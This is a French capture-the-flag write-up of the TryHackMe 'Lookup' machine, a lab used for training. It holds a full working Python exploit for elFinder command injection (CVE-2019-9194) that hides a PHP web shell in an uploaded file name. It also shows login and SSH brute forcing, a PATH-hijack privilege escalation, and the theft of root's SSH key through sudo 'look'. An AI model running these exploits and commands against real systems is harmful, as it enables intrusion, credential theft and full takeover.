# LOOKUP - TRY HACK ME BOOT TO ROOT MACHINE
- Difficulté : FACILE
- Objectif : **Boot-to-root**

### Instruction
« Lookup » constitue une véritable mine d'opportunités d'apprentissage pour les hackers en herbe. Cette machine fascinante présente diverses vulnérabilités rencontrées dans des environnements réels, allant des failles dans les applications web aux techniques d'élévation de privilèges. En explorant et en exploitant ces vulnérabilités, les hackers peuvent affiner leurs compétences et acquérir une expérience inestimable en matière de piratage éthique. Grâce à « Lookup », ils peuvent maîtriser l'art de la reconnaissance, du scan et de l'énumération afin de découvrir des services cachés et des sous-domaines. Ils apprendront à exploiter des vulnérabilités d'applications web, telles que l'injection de commandes, et comprendront l'importance des pratiques de développement sécurisé. Cette machine incite également les hackers à automatiser leurs tâches, illustrant ainsi toute la puissance des scripts dans le cadre des tests d'intrusion.

## RECONNAISSANCE
Port ouvert : 22, 80

Nom de domaine trouvé : lookup.thm
Formulaire de login trouvé sur http://lookup.thm

### FUZZING nom d'utilisateur
```kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/lookup$ ffuf -w ../wordlists/xato-net-10-million-usernames.txt -X POST -u http://lookup.thm/login.php -d "username=FUZZ&password=pwned" -H "Content-Type: application/x-www-form-urlencoded" -fs 74

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /home/kryptonite/Bureau/hacking/labs/tryhackme/wordlists/xato-net-10-million-usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=pwned
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 74
________________________________________________

admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 282ms]
jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 263ms]
```
### FUZZING MOT DE PASSE 
```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/lookup$ ffuf -w ../wordlists/xato-net-10-million-usernames.txt -X POST -u http://lookup.thm/login.php -d "username=FUZZ&password=password123" -H "Content-Type: application/x-www-form-urlencoded" -fs 74

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /home/kryptonite/Bureau/hacking/labs/tryhackme/wordlists/xato-net-10-million-usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=password123
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 74
________________________________________________

jose                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 252ms]

```

### MODIFYING HOST
10.80.179.18 files.lookup.thm  www.lookup.thm lookup.thm

### VALID CREDENTIALS 
jose:password123

### EXPLORING FILES 
swaddle
throbbed
rycca
show-offs
overcast
packinghouse
acculturation
rotterdam
idiosyncratically
symmetrical
volumetrically
....

C'est comme des mots aléatoires, mais on va justifier notre hypothèse plus tard

### VERSION DE ELFINDER 
elFinder
Gestionnaire de fichier Web
Version: 2.1.47
Version du protocole: 2.1047
jQuery/jQuery UI: 3.3.1/1.12.1

CVE : COMMANDE INJECTION - cve-2019-9194

## EXPLOITATION


Avec metasploit, on a eu un problème avec la taille du payload

### CODING EXPLOIT
```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/lookup$ cat exploit.py 
#!/usr/bin/env python3

import requests
import json
import sys

payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'

def usage():
    if len(sys.argv) != 2:
        print("Usage: python3 exploit3.py [URL]")
        sys.exit(0)

def upload(url, payload):
    files = {'upload[]': (payload, open('SecSignal.jpg', 'rb'))}
    data = {"reqid": "1693222c439f4", "cmd": "upload", "target": "l1_Lw", "mtime[]": "1497726174"}
    r = requests.post("%s/php/connector.minimal.php" % url, files=files, data=data)
    j = json.loads(r.text)
    return j['added'][0]['hash']

def imgRotate(url, hash):
    r = requests.get("%s/php/connector.minimal.php?target=%s&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c" % (url, hash))
    return r.text

def shell(url):
    r = requests.get("%s/php/SecSignal.php" % url)
    if r.status_code == 200:
        print("[+] Pwned! :)")
        print("[+] Getting the shell...")
        while True:
            try:
                cmd = input("$ ")
                r = requests.get("%s/php/SecSignal.php?c=%s" % (url, cmd))
                print(r.text)
            except KeyboardInterrupt:
                sys.exit("\nBye kaker!")
    else:
        print("[*] The site seems not to be vulnerable :(")

def main():
    usage()
    url = sys.argv[1]
    print("[*] Uploading the malicious image...")
    h = upload(url, payload)
    print("[*] Running the payload...")
    imgRotate(url, h)
    shell(url)

if __name__ == "__main__":
    main()
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/lookup$ 
```

## EXPLOITING REVERSE SHELL SYSTEM 
```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/lookup$ python3 exploit.py http://files.lookup.thm/elFinder
[*] Uploading the malicious image...
[*] Running the payload...
[+] Pwned! :)
[+] Getting the shell...
$ ls
MySQLStorage.sql
SecSignal.php
autoload.php
connector.minimal.php
editors
elFinder.class.php
elFinderConnector.class.php
elFinderFlysystemGoogleDriveNetmount.php
elFinderPlugin.php
elFinderSession.php
elFinderSessionInterface.php
elFinderVolumeBox.class.php
elFinderVolumeDriver.class.php
elFinderVolumeDropbox.class.php
elFinderVolumeDropbox2.class.php
elFinderVolumeFTP.class.php
elFinderVolumeGoogleDrive.class.php
elFinderVolumeGroup.class.php
elFinderVolumeLocalFileSystem.class.php
elFinderVolumeMySQL.class.php
elFinderVolumeOneDrive.class.php
elFinderVolumeTrash.class.php
elFinderVolumeTrashMySQL.class.php
libs
mime.types
plugins
resources

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ whoami
www-data

$ ls -la /home/think/
total 40
drwxr-xr-x 5 think think 4096 Jan 11  2024 .
drwxr-xr-x 5 root  root  4096 Nov  4 09:45 ..
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
drwx------ 3 think think 4096 Aug  9  2023 .gnupg
-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
drw-r----- 2 think think 4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
-rw-r----- 1 root  think   33 Jul 30  2023 user.txt

$ find / -perm -4000 -type f 2>/dev/null
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core20/1950/usr/bin/chfn
/snap/core20/1950/usr/bin/chsh
/snap/core20/1950/usr/bin/gpasswd
/snap/core20/1950/usr/bin/mount
/snap/core20/1950/usr/bin/newgrp
/snap/core20/1950/usr/bin/passwd
/snap/core20/1950/usr/bin/su
/snap/core20/1950/usr/bin/sudo
/snap/core20/1950/usr/bin/umount
/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1950/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount

$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found

$ echo -e '#!/bin/bash\necho "uid=1000(think) gid=1000(think) groups=1000(think)"' > /tmp/id

$ chmod +x /tmp/id

$ export PATH=/tmp:$PATH

$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found

$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ cd /tmp
ls

```
### CONTOURNEMENT VIA CURL 
```

kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/lookup$ curl -s -G 'http://files.lookup.thm/elFinder/php/SecSignal.php' \
  --data-urlencode 'c=echo IyEvYmluL2Jhc2gKZWNobyAidWlkPTEwMDAodGhpbmspIGdpZD0xMDAwKHRoaW5rKSBncm91cHM9MTAwMCh0aGluaykiCg== | base64 -d > /tmp/id'
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/lookup$ curl -s -G 'http://files.lookup.thm/elFinder/php/SecSignal.php' \
  --data-urlencode 'c=chmod +x /tmp/id'
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/lookup$ curl -s -G 'http://files.lookup.thm/elFinder/php/SecSignal.php' \
  --data-urlencode 'c=PATH=/tmp:$PATH /usr/sbin/pwm'
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
```
C'est stocké sur password.txt

### BRUTE FORCE SSH
```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/lookup$ hydra -l think -P password.txt ssh://10.80.179.18
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-04 14:20:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://10.80.179.18:22/
[22][ssh] host: 10.80.179.18   login: think   password: josemario.AKA(think)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-04 14:20:35
```
### SSH LOGIN and ENUMERATION
```
think@ip-10-80-179-18:~$ ls
user.txt
think@ip-10-80-179-18:~$ cat user.txt
REDACTED
think@ip-10-80-179-18:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on ip-10-80-179-18:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on ip-10-80-179-18:
    (ALL) /usr/bin/look
think@ip-10-80-179-18:~$ /usr/bin/look
usage: look [-bdf] [-t char] string [file ...]
think@ip-10-80-179-18:~$ LFILE=/root/root.txt
think@ip-10-80-179-18:~$ look '' "$LFILE"
look: /root/root.txt: Permission denied

```

chercher le id_rsa avec look 

```
think@ip-10-80-179-18:~$ sudo /usr/bin/look '' /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
REDACTED
3qXILoUzSmRum2r6eTHXVZbbX2NCBj7uH2PUgpzso9m7qdf7nb7BKkR585f4pUuI01pUD0
DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
-----END OPENSSH PRIVATE KEY-----
```

## PRIVILEGE ESCALATION
```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/lookup$ ssh root@10.80.179.18 -i id_rsa 
root@ip-10-80-179-18:~# 
root@ip-10-80-179-18:~# ls
total 52K
drwx------  6 root root 4.0K May 28  2025 .
drwxr-xr-x 19 root root 4.0K Nov  4 09:45 ..
lrwxrwxrwx  1 root root    9 Jun  2  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.2K May 12  2024 .bashrc
drwx------  2 root root 4.0K Jan 11  2024 .cache
drwx------  3 root root 4.0K Apr 17  2024 .config
drwxr-xr-x  3 root root 4.0K Jun 21  2023 .local
-rw-r--r--  1 root root  161 Jan 11  2024 .profile
lrwxrwxrwx  1 root root    9 Jul 31  2023 .selected_editor -> /dev/null
drwx------  2 root root 4.0K May 28  2025 .ssh
-rw-rw-rw-  1 root root  11K May 28  2025 .viminfo
-rwxrwx---  1 root root   66 Jan 11  2024 cleanup.sh
-rw-r-----  1 root root   33 Jan 11  2024 root.txt
root@ip-10-80-179-18:~# cat root.txt
REDACTED
root@ip-10-80-179-18:~# 
```

